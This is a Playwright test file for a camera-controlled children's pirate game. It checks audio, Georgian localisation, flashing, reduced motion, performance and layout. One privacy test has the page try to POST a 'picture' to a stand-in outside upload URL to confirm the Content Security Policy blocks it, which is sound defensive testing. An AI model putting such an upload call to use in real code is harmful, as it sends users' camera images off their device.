// How Cannon Bay sounds, and that nothing in it flashes, leaves this computer or breaks.
import { expect, openGame, screenName, shot, show, test, waitForHand, waitForScreen } from '../helpers.js';
import { battleState, beatPirates, expectSoon, holdPirate, letPirateGo, sailTowardsPirates, startPlaying, stopSailing } from './helpers.js';

for (const language of ['en', 'ka']) {
  test(`every sound and every voice line loads and decodes, in ${language}`, async ({ page }) => {
    await openGame(page, { voice: true, sound: true, language }, 'cannon-bay');
    await show(page, null, 'open', { scale: 0.7 });
    await page.locator('#start').click();
    await expect.poll(() => page.evaluate(() => window.__game.screen), { timeout: 60_000 }).toBe('check');
    const loaded = await page.evaluate(async () => {
      const { sound } = window.__game;
      await sound.ready;
      return {
        wanted: new Set(sound.lines.map(({ text }) => text)).size,
        clips: [...sound.voiceClips.entries()].map(([text, clip]) => [text, clip.duration]),
        sounds: Object.fromEntries([...sound.buffers.entries()].map(([name, clip]) => [name, clip.duration])),
      };
    });
    expect(loaded.clips.length).toBe(loaded.wanted);
    for (const [text, duration] of loaded.clips) {
      expect(duration, text).toBeGreaterThan(0.15);
      expect(duration, text).toBeLessThan(6);
    }
    for (const name of ['cannon', 'splash', 'thud', 'canvas', 'row', 'horn', 'down', 'sparkle']) expect(loaded.sounds[name], name).toBeGreaterThan(0.05);
    for (const name of ['waves', 'wash', 'creak', 'wind', 'gulls', 'music']) expect(loaded.sounds[name], name).toBeGreaterThan(5);
  });
}

test('the sea plays all through a battle and stops at the end, nothing clips, and no line gets cut off', async ({ page }) => {
  test.setTimeout(480_000);
  await startPlaying(page, { voice: true, sound: true, bayShips: 4, bayPace: 'fast' });
  await page.evaluate(() => {
    const { sound } = window.__game;
    window.__voicesCutOff = 0;
    window.__said = [];
    const realStop = sound.stopVoice.bind(sound);
    sound.stopVoice = () => {
      if (sound.currentVoice) window.__voicesCutOff += 1;
      realStop();
    };
    const realSpeak = sound.speak.bind(sound);
    sound.speak = (text, clip, after) => {
      window.__said.push(text);
      realSpeak(text, clip, after);
    };
    window.__tap = sound.context.createAnalyser();
    window.__tap.fftSize = 2048;
    sound.output.connect(window.__tap);
    window.__peak = 0;
    const samples = new Float32Array(2048);
    setInterval(() => {
      window.__tap.getFloatTimeDomainData(samples);
      for (const sample of samples) window.__peak = Math.max(window.__peak, Math.abs(sample));
    }, 20);
  });
  expect(await page.evaluate(() => [...window.__game.sound.loops.keys()].sort())).toEqual(['creak', 'gulls', 'music', 'wash', 'waves', 'wind']);
  await sailTowardsPirates(page);
  await expect.poll(() => screenName(page), { timeout: 420_000, intervals: [200] }).toBe('finish');
  await stopSailing(page);
  const peak = await page.evaluate(() => window.__peak);
  console.log('loudest moment', peak);
  expect(peak).toBeGreaterThan(0.05);
  expect(peak).toBeLessThanOrEqual(1);
  const said = await page.evaluate(() => window.__said);
  console.log('said', said);
  expect(said.length).toBeLessThan(16);
  expect(await page.evaluate(() => window.__voicesCutOff)).toBe(0);
  // Only what's running out, as each loop fades before it stops.
  expect(await page.evaluate(() => window.__game.sound.loops.size)).toBe(0);
});

test('the wind and the water follow the sails', async ({ page }) => {
  await startPlaying(page, { sound: true, bayShips: 4 });
  await holdPirate(page, { off: Math.PI, away: 600 });
  const level = (name) => page.evaluate((loop) => window.__game.sound.loops.get(loop).gain.gain.value, name);
  await expect.poll(() => level('wash'), { timeout: 10_000 }).toBeGreaterThan(0.15);
  await expect.poll(() => level('wind'), { timeout: 10_000 }).toBeGreaterThan(0.12);
  await show(page, null, 'fist', { scale: 0.7 });
  await waitForHand(page, 'closed');
  await expect.poll(() => level('wash'), { timeout: 15_000 }).toBeLessThan(0.1);
  await expect.poll(() => level('wind'), { timeout: 15_000 }).toBeLessThan(0.08);
  await letPirateGo(page);
});

test('Georgian: what\'s said and shown changes language', async ({ page }) => {
  await startPlaying(page, { language: 'ka', bayShips: 4 });
  await expect(page.locator('#story-line')).toHaveText('მეკობრეებს ჩვენი განძი უნდათ! დამეხმარე, გავყაროთ ისინი!', { timeout: 10_000 });
  await expect(page.locator('#story-name')).toHaveText('ჯოზე');
  await show(page, null, 'fist', { scale: 0.7 });
  await waitForHand(page, 'closed');
  await expect(page.locator('#prompt-text')).toHaveText('გაშალე ხელი, რომ იალქნები ავწიოთ!', { timeout: 10_000 });
  await page.waitForTimeout(300);
  await shot(page, 'c-georgian');
});

test('Joze says the mission as it begins, and each captain speaks as they come near, without anything waiting', async ({ page }) => {
  await startPlaying(page, { bayShips: 4 });
  await expect(page.locator('#story')).toHaveAttribute('data-who', 'joze', { timeout: 10_000 });
  await expect(page.locator('#story-line')).toContainText('Pirates want our treasure');
  await page.waitForTimeout(300);
  await shot(page, 'c-mission');
  // Already sailing while it's said.
  expect((await battleState(page)).state).toBe('sailing');
  await expect.poll(async () => page.locator('#story').getAttribute('data-who'), { timeout: 25_000 }).not.toBe('joze');
  const who = await page.locator('#story').getAttribute('data-who');
  const order = await page.evaluate(() => window.__game.game.order);
  expect(order).toContain(who);
  await page.waitForTimeout(300);
  await shot(page, 'c-captain-speaks');
});

test('the game makes no requests off this computer, and the page refuses to', async ({ page, baseURL, pageErrors }) => {
  const requests = [];
  page.on('request', (request) => requests.push(request.url()));
  await startPlaying(page, { bayShips: 4, sound: true, voice: true });
  await page.waitForTimeout(1000);
  const offsite = requests.filter((url) => !url.startsWith(baseURL) && !url.startsWith('data:') && !url.startsWith('blob:'));
  expect(offsite).toEqual([]);
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/upload', { method: 'POST', body: 'picture' });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
  await expect.poll(() => pageErrors.join('\n')).toContain("violates the following Content Security Policy directive: \"connect-src 'self'\"");
  pageErrors.length = 0;
});

test('a camera that isn\'t allowed explains itself and can be tried again', async ({ page }) => {
  await openGame(page, {}, 'cannon-bay');
  await show(page, null, 'open', { scale: 0.7 });
  await page.evaluate(() => {
    window.__camera.failWith = 'NotAllowedError';
  });
  await page.locator('#start').click();
  await waitForScreen(page, 'problem');
  await expect(page.locator('#problem-title')).toHaveText('Can we use your camera?');
  await page.evaluate(() => {
    window.__camera.failWith = null;
  });
  await page.locator('#problem-retry').click();
  await waitForScreen(page, 'check');
});

test('a frozen tracker counts as no hand: the sails come down and the cannons stop', async ({ page }) => {
  await startPlaying(page, { bayShips: 4 });
  await holdPirate(page, { off: Math.PI * 0.4, away: 95 });
  await expectSoon(async () => (await battleState(page)).stats.shots).toBeGreaterThan(0);
  await page.evaluate(() => {
    window.__game.camera.onResult = () => {};
    window.__game.camera.sendFrame = async () => {};
  });
  await waitForHand(page, 'missing');
  await expectSoon(async () => (await battleState(page)).sails).toBeLessThan(0.1);
  const { shots } = (await battleState(page)).stats;
  await page.waitForTimeout(1500);
  expect((await battleState(page)).stats.shots).toBe(shots);
  await letPirateGo(page);
});

/** How bright the whole picture is, frame by frame. */
const brightnessOverFrames = (page, frames) => page.evaluate(async (count) => {
  const { bay } = window.__game;
  const reading = [];
  const small = document.createElement('canvas');
  small.width = 32;
  small.height = 18;
  const context = small.getContext('2d', { willReadFrequently: true });
  for (let i = 0; i < count; i += 1) {
    await new Promise((resolve) => requestAnimationFrame(resolve));
    bay.render();
    context.drawImage(bay.canvas, 0, 0, 32, 18);
    const { data } = context.getImageData(0, 0, 32, 18);
    let total = 0;
    for (let j = 0; j < data.length; j += 4) total += (data[j] + data[j + 1] + data[j + 2]) / 3;
    reading.push(total / (32 * 18));
  }
  return reading;
}, frames);

const biggestStep = (reading) => Math.max(...reading.slice(1).map((value, index) => Math.abs(value - reading[index])));

test('nothing flashes: the picture\'s brightness stays steady through firing, splashes, hits and sinking', async ({ page }) => {
  test.setTimeout(120_000);
  await startPlaying(page, { bayShips: 4 });
  await holdPirate(page, { off: Math.PI * 0.35, away: 70, quiet: false });
  // Their balls too, right on the ship, and a lot of them.
  await page.evaluate(() => {
    window.__showers = setInterval(() => {
      const { battle } = window.__game;
      const [pirate] = battle.afloat;
      if (pirate) {
        pirate.burstSide = 1;
        pirate.burstLeft = 3;
        pirate.burstIn = 0;
      }
    }, 900);
  });
  const firing = await brightnessOverFrames(page, 90);
  const steps = biggestStep(firing);
  console.log('biggest brightness step while firing', steps);
  expect(steps).toBeLessThan(6);
  expect((await battleState(page)).stats.hits).toBeGreaterThan(1);

  // The zone going from nothing to green, as the hand opens and closes, is the biggest change there is.
  await show(page, null, 'fist', { scale: 0.7 });
  const closing = await brightnessOverFrames(page, 50);
  console.log('biggest brightness step as the cannons stop', biggestStep(closing));
  expect(biggestStep(closing)).toBeLessThan(6);
  await show(page, null, 'open', { scale: 0.7 });
  const opening = await brightnessOverFrames(page, 50);
  console.log('biggest brightness step as the cannons start', biggestStep(opening));
  expect(biggestStep(opening)).toBeLessThan(6);

  // A ship beaten right beside the child's, with all its smoke.
  await page.evaluate(() => clearInterval(window.__showers));
  await letPirateGo(page);
  const [sinking] = await Promise.all([brightnessOverFrames(page, 120), beatPirates(page, 1)]);
  console.log('biggest brightness step as a ship sinks', biggestStep(sinking));
  expect(biggestStep(sinking)).toBeLessThan(6);
  await shot(page, 'c-smoke');
});

test('with reduced motion the battle still works, with calmer waves and a steadier ship', async ({ page }) => {
  await page.emulateMedia({ reducedMotion: 'reduce' });
  await startPlaying(page, { bayShips: 4 });
  const calm = await page.evaluate(() => {
    const { bay } = window.__game;
    return { calm: bay.calm, waves: bay.water.uSize.value };
  });
  expect(calm.calm).toBeLessThan(0.5);
  expect(calm.waves).toBeLessThan(1.5);
  await expect(page.locator('.film')).toBeVisible();
  expect(await page.locator('.film-finger').first().evaluate((node) => parseFloat(getComputedStyle(node).animationDuration))).toBeGreaterThan(5);
  await holdPirate(page, { off: Math.PI * 0.4, away: 95 });
  await expectSoon(async () => (await battleState(page)).stats.hits).toBeGreaterThan(1);
  await page.waitForTimeout(600);
  const roll = await page.evaluate(async () => {
    const { bay } = window.__game;
    let most = 0;
    for (let i = 0; i < 90; i += 1) {
      await new Promise((resolve) => requestAnimationFrame(resolve));
      most = Math.max(most, Math.abs(bay.heroRock.roll));
    }
    return most;
  });
  console.log('most roll with reduced motion', roll);
  expect(roll).toBeLessThan(0.05);
  await shot(page, 'c-reduced-motion');
  await letPirateGo(page);
});

test('a slow computer gives up sharpness, then waves and trees, and keeps sailing', async ({ page }) => {
  await startPlaying(page, { bayShips: 4 });
  const level = await page.evaluate(() => {
    const { bay } = window.__game;
    const trees = bay.island.manyOf[0].count;
    const cells = bay.sea.geometry.attributes.position.count;
    bay.quality = 2;
    bay.frames = 0;
    bay.slowFrames = 0;
    for (let i = 0; i < 90; i += 1) bay.watchSpeed(0.05);
    const first = [bay.quality, bay.renderer.getPixelRatio()];
    for (let i = 0; i < 90; i += 1) bay.watchSpeed(0.05);
    return { first, second: bay.quality, fewer: bay.island.manyOf[0].count < trees, coarser: bay.sea.geometry.attributes.position.count < cells };
  });
  expect(level).toEqual({ first: [1, 1], second: 0, fewer: true, coarser: true });
  await page.waitForTimeout(800);
  await shot(page, 'c-low-quality');
  expect(await page.evaluate(() => window.__game.screen)).toBe('playing');
  expect((await battleState(page)).state).toBe('sailing');
});

test('it runs quickly enough, with everything going on', async ({ page }) => {
  await startPlaying(page, { bayShips: 9 });
  await holdPirate(page, { off: Math.PI * 0.4, away: 95, quiet: false });
  await page.waitForTimeout(2000);
  const rate = await page.evaluate(() => new Promise((done) => {
    let frames = 0;
    const started = performance.now();
    const count = () => {
      frames += 1;
      if (performance.now() - started > 4000) done(frames / 4);
      else requestAnimationFrame(count);
    };
    requestAnimationFrame(count);
  }));
  console.log('frames a second', rate, 'quality', await page.evaluate(() => window.__game.bay.quality));
  expect(rate).toBeGreaterThan(28);
  await letPirateGo(page);
});

for (const [width, height, name] of [[1024, 600, 'laptop'], [820, 1180, 'tablet'], [1920, 1080, 'big']]) {
  test(`it all fits on a ${name} screen`, async ({ page }) => {
    await page.setViewportSize({ width, height });
    await startPlaying(page, { bayShips: 9 });
    await page.waitForTimeout(800);
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - innerWidth);
    expect(overflow).toBeLessThanOrEqual(0);
    for (const target of ['#ship-wheel', '#open-panel', '#hearts', '#meter-right']) await expect(page.locator(target)).toBeInViewport();
    await shot(page, `c-fits-${name}`);
  });
}
